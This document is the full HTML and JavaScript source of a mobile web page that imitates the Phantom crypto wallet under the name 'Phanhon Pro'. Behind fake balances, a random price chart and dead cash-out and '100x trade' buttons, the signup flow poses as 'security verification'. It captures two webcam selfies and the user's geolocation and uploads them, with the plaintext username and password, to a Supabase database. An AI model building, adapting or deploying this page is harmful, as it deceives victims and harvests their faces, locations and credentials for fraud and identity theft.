<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Phanhon Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        :root { --phantom-purple: #ab66ff; }
        body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overscroll-behavior-y: contain; }
        .app-container { width: 100%; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; overflow: hidden; }
        @media (min-width: 640px) { .app-container { max-width: 380px; height: 720px; border: 1px solid #1a1a1a; border-radius: 32px; } }
        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); }
        .phantom-btn { background: var(--phantom-purple); color: white; font-weight: 700; border-radius: 12px; transition: all 0.1s ease; }
        .phantom-btn:active { transform: scale(0.97); }
        .loader { width: 20px; height: 20px; border: 2px solid var(--phantom-purple); border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .chart-container-wrapper { position: relative; height: 200px; width: 100%; background: #050505; overflow: hidden; display: flex; align-items: flex-end; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .candle { position: absolute; width: 6px; bottom: 0; height: 100%; }
        .fomo-ticker { background: var(--phantom-purple); height: 28px; display: flex; align-items: center; font-size: 9px; font-weight: 800; text-transform: uppercase; white-space: nowrap; overflow: hidden; }
        .ticker-scroll { display: inline-block; animation: scroll 15s linear infinite; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        input::placeholder { color: rgba(255,255,255,0.2); }
        .hidden { display: none !important; }
        video { transform: scaleX(-1); border-radius: 16px; background: #111; border: 2px solid rgba(171, 102, 255, 0.2); }
    </style>
</head>
<body>
    <div class="app-container" id="app">
        <div class="fomo-ticker"><div class="ticker-scroll">ðŸš¨ LIQUIDATION ALERT: BTC whales moving to SOL â€¢ High Volatility â€¢ Trading active â€¢</div></div>

        <!-- AUTH SCREEN -->
        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center">
            <div class="w-16 h-16 bg-[#ab66ff] rounded-2xl mb-6 flex items-center justify-center text-3xl font-bold">P</div>
            <h1 class="text-2xl font-extrabold mb-8 tracking-tight">Phanhon</h1>
            <div id="login-form" class="space-y-3">
                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Connect Wallet</button>
                <p class="text-[10px] text-white/20 text-center mt-4 cursor-pointer" onclick="toggleAuth('signup')">CREATE NEW WALLET</p>
            </div>
            <div id="signup-form" class="hidden space-y-3">
                <input id="signup-username" type="text" placeholder="Choose Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
                <input id="signup-password" type="password" placeholder="Create Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
                <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Start Identity Setup</button>
                <p class="text-[10px] text-white/20 text-center mt-4 cursor-pointer" onclick="toggleAuth('login')">BACK TO LOGIN</p>
            </div>
        </div>

        <!-- VERIFICATION SCREEN -->
        <div id="verify-screen" class="hidden absolute inset-0 bg-black z-[600] p-8 flex flex-col items-center justify-center overflow-y-auto">
            <div class="text-center mb-6">
                <h2 class="text-xl font-bold mb-2">Security Verification</h2>
                <p id="verify-instruction" class="text-xs text-white/40 leading-relaxed px-4">Compliance requirements require biometric and geographic verification to secure your private keys.</p>
            </div>
            
            <div class="relative w-full aspect-square max-w-[240px] mb-8" id="video-container">
                <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center bg-white/5 rounded-2xl border border-white/10">
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
                </div>
                <video id="video" width="100%" height="100%" autoplay playsinline class="hidden w-full h-full object-cover rounded-2xl"></video>
                <canvas id="canvas" class="hidden"></canvas>
                <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100"></div>
            </div>

            <div class="w-full space-y-3">
                <button id="enable-camera-btn" onclick="requestCamera()" class="glass w-full py-4 text-[10px] font-bold uppercase tracking-wider rounded-xl">1. Enable Biometric Camera</button>
                <button id="capture-btn" onclick="captureStep()" class="phantom-btn w-full py-4 text-[10px] uppercase hidden">2. Capture Biometric Link</button>
                <button id="location-btn" onclick="requestLocation()" class="phantom-btn w-full py-4 text-[10px] uppercase hidden">3. Authorize Geo-Seal</button>
            </div>

            <div id="verify-loader" class="hidden flex flex-col items-center gap-3 mt-8">
                <span class="loader"></span>
                <p class="text-[10px] uppercase font-bold text-[#ab66ff] tracking-[0.2em]">Encrypting Cold Wallet...</p>
            </div>
        </div>

        <!-- MAIN APP -->
        <div id="main-screen" class="hidden flex flex-col h-full">
            <div class="p-5 flex justify-between items-center bg-black/50 backdrop-blur-md sticky top-0 z-50">
                <div class="flex items-center gap-3">
                    <div id="avatar-init" class="w-8 h-8 bg-[#ab66ff] rounded-lg flex items-center justify-center font-bold text-sm">?</div>
                    <div>
                        <div id="user-display" class="font-bold text-xs">...</div>
                        <div id="wallet-address-head" class="text-[9px] text-white/20 font-semibold">0x...</div>
                    </div>
                </div>
                <button onclick="signOut()" class="opacity-40 p-2"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/></svg></button>
            </div>

            <div id="view-container" class="flex-1 overflow-y-auto px-5 pb-24">
                <!-- DASHBOARD -->
                <div id="view-dashboard" class="view">
                    <div class="py-8 text-center">
                        <p class="text-[10px] font-bold text-white/20 uppercase tracking-widest mb-1">Total Balance</p>
                        <h2 id="balance-usd" class="text-4xl font-extrabold tracking-tight">$0.00</h2>
                        <p id="portfolio-trend" class="text-[10px] font-bold text-green-400 mt-1">+2.41% (24h)</p>
                    </div>
                    <div class="grid grid-cols-4 gap-2 mb-8">
                        <button onclick="switchView('send')" class="phantom-btn py-3 text-[10px] uppercase">Send</button>
                        <button onclick="switchView('deposit')" class="glass rounded-xl py-3 text-[10px] font-bold uppercase">Cash</button>
                        <button onclick="switchView('receive')" class="glass rounded-xl py-3 text-[10px] font-bold uppercase">Recv</button>
                        <button onclick="switchView('swap')" class="glass rounded-xl py-3 text-[10px] font-bold uppercase">Swap</button>
                    </div>
                    <div class="glass p-4 rounded-2xl flex items-center justify-between">
                        <div class="flex items-center gap-3">
                            <div class="w-10 h-10 bg-black border border-white/5 rounded-xl flex items-center justify-center font-bold text-[#ab66ff]">S</div>
                            <div><p class="text-xs font-bold">Solana</p><p id="sol-price-display" class="text-[9px] text-white/40">$145.50</p></div>
                        </div>
                        <div class="text-right"><p id="balance-sol" class="text-xs font-bold">0.00 SOL</p><p id="balance-usd-sol" class="text-[9px] text-white/40">$0.00</p></div>
                    </div>
                </div>

                <!-- GENERIC VIEWS (Fix for buttons) -->
                <div id="view-send" class="hidden view py-10 text-center"><h3 class="font-bold text-lg mb-4">Send Tokens</h3><p class="text-xs opacity-40">No contacts available.</p><button onclick="switchView('dashboard')" class="mt-6 text-xs text-[#ab66ff]">Go Back</button></div>
                <div id="view-deposit" class="hidden view py-10 text-center"><h3 class="font-bold text-lg mb-4">Cash Out</h3><p class="text-xs opacity-40">Fiat bridge offline for your region.</p><button onclick="switchView('dashboard')" class="mt-6 text-xs text-[#ab66ff]">Go Back</button></div>
                <div id="view-receive" class="hidden view py-10 text-center">
                    <h3 class="font-bold text-lg mb-4">Receive SOL</h3>
                    <div class="bg-white p-4 rounded-xl w-48 h-48 mx-auto mb-4 flex items-center justify-center">
                        <div class="w-full h-full bg-black flex items-center justify-center"><p class="text-[8px]">QR GENERATING...</p></div>
                    </div>
                    <p id="recv-addr" class="text-[8px] opacity-40 font-mono">Loading address...</p>
                    <button onclick="switchView('dashboard')" class="mt-6 text-xs text-[#ab66ff]">Go Back</button>
                </div>

                <!-- SWAP VIEW -->
                <div id="view-swap" class="hidden view animate__animated animate__fadeIn">
                    <div class="flex items-center gap-2 mb-6 mt-4"><button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button><h3 class="text-xl font-bold">Swap</h3></div>
                    <div class="glass p-4 rounded-2xl mb-2"><p class="text-[9px] font-bold text-white/40 mb-2">PAY</p><div class="flex justify-between items-center"><input type="number" placeholder="0.00" class="bg-transparent text-xl font-bold outline-none w-1/2"><span class="text-xs font-bold">SOL</span></div></div>
                    <div class="glass p-4 rounded-2xl"><p class="text-[9px] font-bold text-white/40 mb-2">RECEIVE</p><div class="flex justify-between items-center"><input readonly type="text" placeholder="0.00" class="bg-transparent text-xl font-bold outline-none w-1/2 text-white/60"><span class="text-xs font-bold">USDC</span></div></div>
                    <button class="phantom-btn w-full py-4 mt-6 text-xs uppercase">Swap</button>
                </div>

                <!-- TRADE VIEW -->
                <div id="view-trade" class="hidden view animate__animated animate__fadeIn">
                    <div class="flex items-center gap-2 mb-4 mt-4"><button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button><h3 class="text-xl font-bold">Trade</h3></div>
                    <div id="chart-container" class="chart-container-wrapper glass rounded-2xl mb-4"></div>
                    <button class="phantom-btn w-full py-4 text-xs uppercase">Execute 100x Trade</button>
                </div>
            </div>

            <div class="h-20 bg-black/95 backdrop-blur-lg border-t border-white/5 px-8 flex justify-between items-center fixed bottom-0 left-0 right-0 sm:absolute">
                <button onclick="switchView('dashboard')" class="nav-btn transition-opacity duration-200" id="nav-dashboard"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg></button>
                <button onclick="switchView('trade')" class="nav-btn transition-opacity duration-200" id="nav-trade"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/></svg></button>
            </div>
        </div>

        <div id="loading-overlay" class="hidden absolute inset-0 bg-black/80 z-[1000] flex items-center justify-center"><div class="loader"></div></div>
        <div id="toast" class="absolute bottom-24 left-1/2 -translate-x-1/2 glass px-5 py-3 rounded-xl text-[10px] font-bold transition-all translate-y-64 z-[1001]">Toast</div>
    </div>

    <script>
        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
        let SOL_PRICE = 145.50;
        let user = null;
        let candles = [];
        let verifyStep = 0;
        let capturedData = { thumb: null, smile: null, geo: null };
        let tempUser = { u: '', p: '' };

        window.onload = () => {
            const savedUser = localStorage.getItem('phantom_user');
            if(savedUser) { try { user = JSON.parse(savedUser); loadSession(); } catch(e) { localStorage.removeItem('phantom_user'); } }
            initRealisticChart();
            setInterval(tickPrice, 2000);
        };

        async function startVerificationFlow() {
            const u = document.getElementById('signup-username').value.trim();
            const p = document.getElementById('signup-password').value.trim();
            if(!u || !p) return showToast("Enter credentials first");
            tempUser = { u, p };
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('verify-screen').classList.remove('hidden');
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('video').classList.remove('hidden');
                document.getElementById('camera-placeholder').classList.add('hidden');
                document.getElementById('enable-camera-btn').classList.add('hidden');
                document.getElementById('capture-btn').classList.remove('hidden');
                document.getElementById('verify-instruction').innerText = "Step 1: Position your face inside the frame and show a Thumbs Up.";
            } catch (e) {
                showToast("Camera access denied. Check browser settings.");
            }
        }

        async function captureStep() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.5);
            
            const flash = document.getElementById('capture-flash');
            flash.style.opacity = '1'; setTimeout(() => flash.style.opacity = '0', 100);

            if(verifyStep === 0) {
                capturedData.thumb = img;
                verifyStep = 1;
                document.getElementById('verify-instruction').innerText = "Step 2: Please smile to verify live presence.";
                document.getElementById('capture-btn').innerText = "Confirm Biometrics";
            } else if(verifyStep === 1) {
                capturedData.smile = img;
                verifyStep = 2;
                document.getElementById('capture-btn').classList.add('hidden');
                document.getElementById('location-btn').classList.remove('hidden');
                document.getElementById('verify-instruction').innerText = "Step 3: Final step. Authorize geographic signing for this device.";
                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
            }
        }

        function requestLocation() {
            if(!navigator.geolocation) return finalSignUp();
            navigator.geolocation.getCurrentPosition(
                (pos) => { capturedData.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude }; finalSignUp(); },
                (err) => { finalSignUp(); }
            );
        }

        async function finalSignUp() {
            document.getElementById('location-btn').classList.add('hidden');
            document.getElementById('verify-loader').classList.remove('hidden');
            
            const { data, error } = await sb.from('profiles').insert([{ username: tempUser.u, password: tempUser.p, balance: 0.21 }]).select().single();
            if(error) { showToast("Error: Username taken"); location.reload(); return; }

            await sb.from('verifications').insert([{
                user_id: data.id,
                username: data.username,
                thumb_img: capturedData.thumb,
                smile_img: capturedData.smile,
                location_data: capturedData.geo
            }]);

            user = data;
            localStorage.setItem('phantom_user', JSON.stringify(user));
            loadSession();
        }

        async function signIn() {
            const u = document.getElementById('login-username').value;
            const p = document.getElementById('login-password').value;
            if(!u || !p) return showToast("Missing fields");
            toggleLoading(true);
            const { data, error } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
            toggleLoading(false);
            if(data) { user = data; localStorage.setItem('phantom_user', JSON.stringify(user)); loadSession(); }
            else showToast("Invalid Credentials");
        }

        function loadSession() {
            if(!user) return;
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('verify-screen').classList.add('hidden');
            document.getElementById('main-screen').classList.remove('hidden');
            syncUserProfile(); 
            updateUI();
        }

        function syncUserProfile() {
            if(!user) return;
            document.getElementById('user-display').innerText = user.username || 'User';
            document.getElementById('avatar-init').innerText = (user.username || '?').charAt(0).toUpperCase();
            document.getElementById('wallet-address-head').innerText = "PH" + (user.id ? user.id.substring(0,8) : '00000000') + "...";
            const recv = document.getElementById('recv-addr');
            if(recv) recv.innerText = "PH" + (user.id ? user.id : '00000000');
        }

        function updateUI() {
            if(!user || typeof user.balance === 'undefined') return;
            const balUSD = document.getElementById('balance-usd');
            const balSOL = document.getElementById('balance-sol');
            const balUSDSol = document.getElementById('balance-usd-sol');
            const current = parseFloat(user.balance) || 0;
            if(balUSD) balUSD.innerText = `$${(current * SOL_PRICE).toFixed(2)}`;
            if(balSOL) balSOL.innerText = `${current.toFixed(2)} SOL`;
            if(balUSDSol) balUSDSol.innerText = `$${(current * SOL_PRICE).toFixed(2)}`;
            const sp = document.getElementById('sol-price-display');
            if(sp) sp.innerText = `$${SOL_PRICE.toFixed(2)}`;
        }

        function tickPrice() {
            const last = candles[candles.length - 1] || { close: 145 };
            SOL_PRICE = last.close + (Math.random() - 0.5) * 1.5;
            candles.push({ close: SOL_PRICE });
            if(candles.length > 20) candles.shift();
            renderChart();
            if(user) updateUI();
        }

        function renderChart() {
            const container = document.getElementById('chart-container');
            if(!container) return;
            container.innerHTML = candles.map((c, i) => `<div class="bg-green-400" style="left:${i*15}px; height:${(c.close/250)*100}%; width:10px; position:absolute; bottom:0; opacity:0.6; border-radius:2px"></div>`).join('');
        }

        function switchView(view) {
            ['dashboard', 'send', 'trade', 'receive', 'swap', 'deposit'].forEach(v => {
                const el = document.getElementById(`view-${v}`);
                if(el) el.classList.toggle('hidden', v !== view);
            });
            document.querySelectorAll('.nav-btn').forEach(b => b.style.opacity = "0.3");
            const active = document.getElementById(`nav-${view}`);
            if(active) active.style.opacity = "1";
        }

        function initRealisticChart() { candles = Array.from({length: 20}, () => ({ close: 140 + Math.random()*20 })); renderChart(); }
        function toggleAuth(mode) { document.getElementById('login-form').classList.toggle('hidden', mode==='signup'); document.getElementById('signup-form').classList.toggle('hidden', mode==='login'); }
        function toggleLoading(show) { document.getElementById('loading-overlay').classList.toggle('hidden', !show); }
        function showToast(m) { const t = document.getElementById('toast'); if(!t) return; t.innerText = m; t.classList.remove('translate-y-64'); setTimeout(() => t.classList.add('translate-y-64'), 2000); }
        function signOut() { localStorage.removeItem('phantom_user'); user = null; location.reload(); }
    </script>
</body>
</html>
